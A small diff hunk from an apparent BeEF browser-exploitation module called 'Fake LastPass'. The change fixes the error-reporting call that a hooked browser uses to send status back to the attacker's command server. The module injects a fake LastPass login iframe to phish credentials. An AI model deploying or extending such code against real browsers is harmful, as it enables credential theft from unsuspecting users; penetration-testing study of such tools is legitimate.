@@ -26,7 +26,7 @@ beef.execute(function() {
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
 	} else {
 		beef.debug('[Fake LastPass] Unspported browser');
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', beef.are.status_error());
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', beef.status.error());
 	}
 
 	// $j('body').append("<div id='lp_login_dia' style='width:375px; height:415px; position: fixed; right: 0px; top: 0px; z-index: "+beef.dom.getHighestZindex()+1+"; border: 1px solid white; overflow: hidden; display: none'></div>");
